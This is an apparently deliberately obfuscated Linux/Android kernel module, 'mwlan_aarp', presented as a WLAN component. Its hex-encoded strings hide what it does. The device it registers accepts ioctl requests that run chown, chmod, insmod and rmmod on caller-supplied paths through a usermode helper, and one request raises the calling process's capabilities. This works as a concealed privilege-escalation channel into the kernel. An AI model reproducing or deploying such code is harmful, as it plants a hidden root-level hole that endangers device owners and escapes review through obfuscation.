/*
   'mwlan_aarp.c' Obfuscated by COBF (Version 1.06 2006-01-07 by BB) at Sun Nov 16 20:00:01 2014
*/
#include<linux/kernel.h>
#include<linux/version.h>
#include<linux/module.h>
#include<linux/fs.h>
#include<linux/in.h>
#include<linux/miscdevice.h>
#include<linux/syscalls.h>
#include<linux/kmod.h>
#include<net/ip.h>
#include<linux/module.h>
#include<linux/ctype.h>
#include<linux/time.h>
#include"cobf.h"
#ifdef _WIN32
#include"uncobf.h"
#include<wtypes.h>
#include"cobf.h"
#else
#ifdef bb55
#include"uncobf.h"
#include<linux/types.h>
#include"cobf.h"
#else
#include"uncobf.h"
#include<stddef.h>
#include<sys/types.h>
#include"cobf.h"
#endif
#endif
#ifdef _WIN32
bba bb53 bb95;
#else
bba bbd bb57, *bb118, *bb183;
#define bb132 1
#define bb242 0
bba bb190 bb204, *bb244, *bb119;bba bbd bb231, *bb138, *bb233;bba bbw
bb105, *bb238, *bb161;bba bby bb188, *bb117;bba bbw bby bb134, *bb139
;bba bby bb65, *bb144;bba bbw bby bb43, *bb92;bba bb43 bb186, *bb232;
bba bb43 bb99, *bb241;bba bb65 bb53, *bb207;bba bb239 bb199;bba bb189
bb208;bba bb130 bb73;bba bb89 bb60;bba bb89 bb126;
#ifdef bb226
bba bb143 bb36, *bb77;bba bb219 bb15, *bb78;bba bb193 bbr, *bb45;bba
bb111 bb47, *bb85;
#else
bba bb162 bb36, *bb77;bba bb121 bb15, *bb78;bba bb102 bbr, *bb45;bba
bb136 bb47, *bb85;
#endif
bba bb36 bb46, *bb29, *bb164;bba bb15 bb202, *bb234, *bb167;bba bb15
bb129, *bb209, *bb166;bba bbr bb71, *bb173, *bb198;bba bb73 bb14, *
bb150, *bb240;bba bbr bb245, *bb237, *bb182;bba bb60 bb135, *bb110, *
bb194;bba bb47 bb195, *bb249, *bb184;
#define bb131 bbn
bba bbn*bb220, *bb100;bba bbk bbn*bb175;bba bbc bb108;bba bbc*bb229;
bba bbk bbc*bb180;
#if defined( bb55)
bba bbd bb50;
#endif
bba bb50 bb7;bba bb7*bb106;bba bbk bb7*bb225;
#if defined( bb145) || defined( bb157)
bba bb7 bb19;bba bb7 bb58;
#else
bba bbc bb19;bba bbw bbc bb58;
#endif
bba bbk bb19*bb98;bba bb19*bb128;bba bb71 bb192, *bb228;bba bbn*bb90;
bba bb90*bb174;
#define bb152( bb11) bbh bb11##__ { bbd bb114; }; bba bbh bb11##__  * \
 bb11
bba bbh{bb14 bb142,bb171,bb218,bb211;}bb97, *bb206, *bb156;bba bbh{
bb14 bb221,bb210;}bb153, *bb123, *bb187;bba bbh{bb14 bb243,bb230;}
bb250, *bb222, *bb93;
#endif
bba bbk bb46*bb148;
#ifdef _WIN32
#ifndef UNDER_CE
#define bb5 bb215
#define bb23 bb212
bba bbw bby bb5;bba bby bb23;
#endif
#else
#endif
#ifdef _WIN32
bbn*bb38(bb5 bb79);bbn bb40(bbn* );bbn*bb56(bb5 bb223,bb5 bb79);
#else
#define bb38( bbe) bb80(1, bbe, bb33)
#define bb40( bbe) bb170( bbe)
#define bb56( bbe, bb59) bb80( bbe, bb59, bb33)
#endif
#ifdef _WIN32
#define bb26( bbe) bb112( bbe)
#else
#ifdef _DEBUG
bbd bb51(bbk bbc*bb96,bbk bbc*bbz,bbw bb213);
#define bb26( bbe) ( bbn)(( bbe) || ( bb51(# bbe, __FILE__, __LINE__)))
#else
#define bb26( bbe) (( bbn)0)
#endif
#endif
bb23 bb147(bb23*bb94);
#ifndef _WIN32
bbd bb197(bbk bbc*bb103);bbd bb104(bbk bbc*bb178,...);
#endif
#ifdef _WIN32
bba bb137 bb70;
#define bb61( bbe) bb177( bbe)
#define bb76( bbe) bb133( bbe)
#define bb64( bbe) bb101( bbe)
#define bb84( bbe) bb246( bbe)
#else
bba bb205 bb70;
#define bb61( bbe) ( bbn)(  *  bbe = bb224( bbe))
#define bb76( bbe) (( bbn)0)
#define bb64( bbe) bb115( bbe)
#define bb84( bbe) bb214( bbe)
#endif
bba bbh{bb29 bb74;bbr bb151;bb29 bb41;bbr bb28;bbr bbx;}bb17;bba bbh{
bbk bbc*bbg;bb141 bb82;bb191 bb86;}bb25;bba bbh{bbk bbc*bbg;bbd bb22;
}bb42;bba bbh{bb57 bb88;bbk bbc*bb6;}bb24;bba bbh{bbd bb216;bbh bb122
 *bb248;bbd bb201;}bb120;bbp bbd bb63(bbh bb12*bb12,bbh bbz*bbz){bbs 0
;}bbp bbd bb72(bbh bb12*bb12,bbh bbz*bbz){bbs 0 ;}bbp bbd bb8(bbc*bbg,
bbc* *bbm,bbc* *bbq,bbd bb30){bbh bb155*bb9;bb185 bb34=(bb30==bb149)?
bb33:bb109;
#ifdef _DEBUG
bbc* *bb20=bbm;bbf("\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72\x6d\x6f\x64"
"\x65\x68\x65\x6c\x70\x65\x72\x5f\x2c\x20\x25\x73",bbg);bb75( *bb20){
bbf("\x20\x25\x73", *bb20);bb20++;}bbf("\n");
#endif
#if LINUX_VERSION_CODE >= bb163( 3, 10, 0 )
bb9=bb52(bbg,bbm,bbq,bb34,bbl,bbl,bbl);
#else
bb9=bb52(bbg,bbm,bbq,bb34);
#endif
bbi(bb9==bbl){bbf("\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72\x6d\x6f\x64"
"\x65\x68\x65\x6c\x70\x65\x72\x5f\x2c\x20\x69\x6e\x66\x6f\x20\x3d\x3d"
"\x20\x4e\x55\x4c\x4c\n");bbs-bb39;}bbs bb179(bb9,bb30);}
//#if defined( PLAT_VER) && PLAT_VER >= 0x50000
#define bb2 "/system/bin/mwlan_helper"
/* #else
#define bb2 "/system/bin/toolbox"
#endif*/
bbp bbd bb81(bbk bbc*bbg,bbd bb62,bbd bb69){bbc bb32[256 ];bbc*bbm[]={
(bbc* )"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x63\x68\x6f"
"\x77\x6e",bb32,(bbc* )bbg,bbl};bbp bbc*bbq[]={"\x48\x4f\x4d\x45\x3d"
"\x2f","\x54\x45\x52\x4d\x3d\x6c\x69\x6e\x75\x78","\x50\x41\x54\x48"
"\x3d\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e",bbl};bbd bbb;bb66(
bb32,"\x25\x64\x2e\x25\x64",bb62,bb69);bbb=bb8(bb2,bbm,bbq,bb16);
#ifdef _DEBUG
bbf("\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72"
"\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x3a\x20\x25\x64\n",bbb);
#endif
bbs bbb;}bbp bbd bb49(bbk bbc*bbg,bbd bb22){bbc bb27[256 ];bbc*bbm[]={
(bbc* )"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x63\x68\x6d"
"\x6f\x64",bb27,(bbc* )bbg,bbl};bbd bbb;bbp bbc*bbq[]={"\x48\x4f\x4d"
"\x45\x3d\x2f","\x54\x45\x52\x4d\x3d\x6c\x69\x6e\x75\x78","\x50\x41"
"\x54\x48\x3d\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e",bbl};bb66(
bb27,"\x25\x6f",bb22);bbb=bb8(bb2,bbm,bbq,bb16);
#ifdef _DEBUG
bbf("\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72"
"\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x3a\x20\x25\x64\n",bbb);
#endif
bbs bbb;}bbp bby bb54(bbh bbz*bbz,bbw bbd bb217,bbw bby bb67){bbr bb48
;bb17 bbo, *bb13=(bb17* )bb67;bb46*bbj=bbl;bbd bbb;bbf("\x6d\x77\x6c"
"\x61\x6e\x5f\x61\x61\x72\x70\x2c\x20\x62\x65\x67\x69\x6e\x20\x64\x65"
"\x76\x5f\x69\x6f\x63\x74\x6c\x5f\n");bbb=bb10(&bbo,bb13,bb18(bb17));
bbi(bbb!=0 ){bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c"
"\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f\x6d\x5f\x75\x73\x65\x72\x2c\x20"
"\x25\x64\n",bbb);bbv bbt;}bbj=bb38(bbo.bb28);bbi(!bbj){bbb=-bb39;bbf
("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x6d\x61"
"\x6c\x6c\x6f\x63\x3a\x20\x25\x64\n",bbb);bbv bbt;}bbb=bb125(bb48,(
bb45)bbo.bb74);bbi(bbb!=0 ){bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f"
"\x63\x74\x6c\x2c\x20\x67\x65\x74\x5f\x75\x73\x65\x72\x3a\x20\x25\x64"
"\n",bbb);bbv bbt;}bbb=bb10(bbj,bbo.bb41,bbo.bb28);bbi(bbb!=0 ){bbf(""
"\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x6f\x70"
"\x79\x5f\x66\x72\x6f\x6d\x5f\x75\x73\x65\x72\x2c\x20\x25\x64\n",bbb);
bbv bbt;}bb113(bb48){bb21 1 :{bb25*bb0=(bb25* )bbj;bbc bbg[256 ];bbb=
bb10(bbg,bb0->bbg,bb18(bbg));bbi(bbb!=0 ){bbf("\x64\x65\x76\x69\x63"
"\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f"
"\x6d\x5f\x75\x73\x65\x72\x2c\x20\x25\x64\n",bbb);bbv bbt;}bbo.bbx=4 ;
 * ((bbr* )bbj)=bb81(bbg,bb0->bb82,bb0->bb86);
#ifdef _DEBUG
bbf("\x63\x68\x6f\x77\x6e\n");
#endif
bb4;}bb21 2 :{bb42*bb0=(bb42* )bbj;bbc bbg[256 ];bbb=bb10(bbg,bb0->bbg,
bb18(bbg));bbi(bbb!=0 ){bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63"
"\x74\x6c\x2c\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f\x6d\x5f\x75\x73\x65"
"\x72\x2c\x20\x25\x64\n",bbb);bbv bbt;}bbo.bbx=4 ; * ((bbr* )bbj)=bb49
(bbg,bb0->bb22);
#ifdef _DEBUG
bbf("\x63\x68\x6d\x6f\x64\n");
#endif
bb4;}bb21 3 :{bb24*bb37=(bb24* )bbj;bbc bb6[256 ];bbc*bbm[]={bbl,bb6,
bbl};bbp bbc*bbq[]={"\x48\x4f\x4d\x45\x3d\x2f","\x54\x45\x52\x4d\x3d"
"\x6c\x69\x6e\x75\x78","\x50\x41\x54\x48\x3d\x2f\x73\x79\x73\x74\x65"
"\x6d\x2f\x62\x69\x6e",bbl};bbb=bb10(bb6,bb37->bb6,256 );bbi(bbb!=0 ){
bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x4f\x49"
"\x44\x5f\x4d\x4f\x44\x2c\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f\x6d\x5f"
"\x75\x73\x65\x72\x2c\x20\x25\x64\n",bbb);bbv bbt;}bbm[0 ]=bb37->bb88?""
"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x69\x6e\x73\x6d\x6f"
"\x64":"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x72\x6d\x6d"
"\x6f\x64"; * (bbr* )bbj=bb8(bb2,bbm,bbq,bb16);bbo.bbx=4 ;
#ifdef _DEBUG
bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61"
"\x6c\x6c\x5f\x75\x73\x65\x72\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72"
"\x5f\x3a\x20\x25\x64\n", * (bbd* )bbj);
#endif
bb4;}bb21 5 :{bbd bbb;bb168{bbh bb181*bbu=bb236();bbi(!bbu){bbb=bb39;
bb4;}bbu->bb31.bb1[0 ]=(1 <<bb124)|(1 <<bb158)|(1 <<bb235);bbu->bb91.bb1[
0 ]=0 ;bbu->bb83.bb1[0 ]=bbu->bb31.bb1[0 ];bbu->bb31.bb1[1 ]=0 ;bbu->bb91.
bb1[1 ]=0 ;bbu->bb83.bb1[1 ]=0 ;bbb=bb227(bbu);}bb75(0 ); * (bbd* )bbj=bbb
;bbo.bbx=bb18(bbd);
#ifdef _DEBUG
bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61"
"\x70\x73\x65\x74\x3a\x20\x25\x64\n",bbb);
#endif
bb4;}}bbb=bb116(bb13->bb41,bbj,bbo.bbx);bbi(bbb!=0 ){bbf("\x64\x65\x76"
"\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x6f\x70\x79\x5f\x66"
"\x72\x6f\x6d\x5f\x75\x73\x65\x72\x2c\x20\x25\x64\n",bbb);bbv bbt;}
bbb=bb172(bbo.bbx,&bb13->bbx);bbi(bbb!=0 ){bbf("\x64\x65\x76\x69\x63"
"\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x70\x75\x74\x5f\x75\x73\x65\x72"
"\x2c\x20\x25\x64\n",bbb);bbv bbt;}bbt:bbi(!bbj)bb40(bbj);bbf("\x6d"
"\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70\x2c\x20\x65\x6e\x64\x20\x64\x65"
"\x76\x5f\x69\x6f\x63\x74\x6c\x5f\n");bbs bbb;}bbp bbh bb165 bb68={.
bb146=bb54,.bb196=bb63,.bb247=bb72,};bbp bbh bb203 bb35={bb159,"\x6d"
"\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70",&bb68};bbd bb200(){bbd bbb;bbf
("\x49\x2d\x57\x4c\x41\x4e\x2f\x6d\x77\x6c\x61\x6e\x5f\x61\x61\x72"
"\x70\x2c\x20\x6d\x77\x6c\x61\x6e\x20\x6b\x6f\x20\x73\x72\x63\x2c\x20"
"\x32\x30\x31\x34\x2e\x31\x30\x2e\x33\x31\n");bbb=bb160(&bb35);bbi(
bbb!=0 ){bbf("\x69\x6e\x69\x74\x5f\x6d\x6f\x64\x75\x6c\x65\x2c\x20\x6d"
"\x69\x73\x63\x5f\x72\x65\x67\x69\x73\x74\x65\x72\x20\x66\x61\x69\x6c"
"\x65\x64\x3a\x20\x25\x64\n",bbb);bbs bbb;}{bbc*bbm[]={"\x2f\x73\x79"
"\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x63\x68\x6f\x77\x6e","\x73\x79"
"\x73\x74\x65\x6d\x2e\x73\x79\x73\x74\x65\x6d","\x2f\x64\x65\x76\x2f" ""
"\x6d\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70",bbl};bbp bbc*bbq[]={"\x48"
"\x4f\x4d\x45\x3d\x2f","\x54\x45\x52\x4d\x3d\x6c\x69\x6e\x75\x78",""
"\x50\x41\x54\x48\x3d\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e",
bbl};bbd bb3,bb44=0 ;bb127(bb3=0 ;bb3<10 ;bb3++){bbb=bb8(bb2,bbm,bbq,
bb16);bbi(bbb==0 )bb4;bb44=bbb;bb169(10 );}bbi(bb3!=0 ){bbf("\x69\x6e"
"\x69\x74\x5f\x6d\x6f\x64\x75\x6c\x65\x2c\x20\x63\x61\x6c\x6c\x5f\x75"
"\x73\x65\x72\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x20\x66\x61"
"\x69\x6c\x65\x64\x2c\x20\x72\x5f\x20\x3a\x20\x25\x64\x2c\x20\x74\x72"
"\x79\x20\x3a\x20\x25\x64\n",bb44,bb3);bbi(bbb!=0 )bbs bbb;}}bbf("\x6d"
"\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70\x20\x69\x6e\x69\x74\x5f\x6d\x6f"
"\x64\x75\x6c\x65\x28\x29\x20\x77\x61\x73\x20\x73\x75\x63\x63\x65\x73"
"\x73\x66\x75\x6c\x2e\n");bbs 0 ;}bbn bb140(){bb107(&bb35);}bb154(""
"\x61\x68\x6f\x70\x65");bb176("");
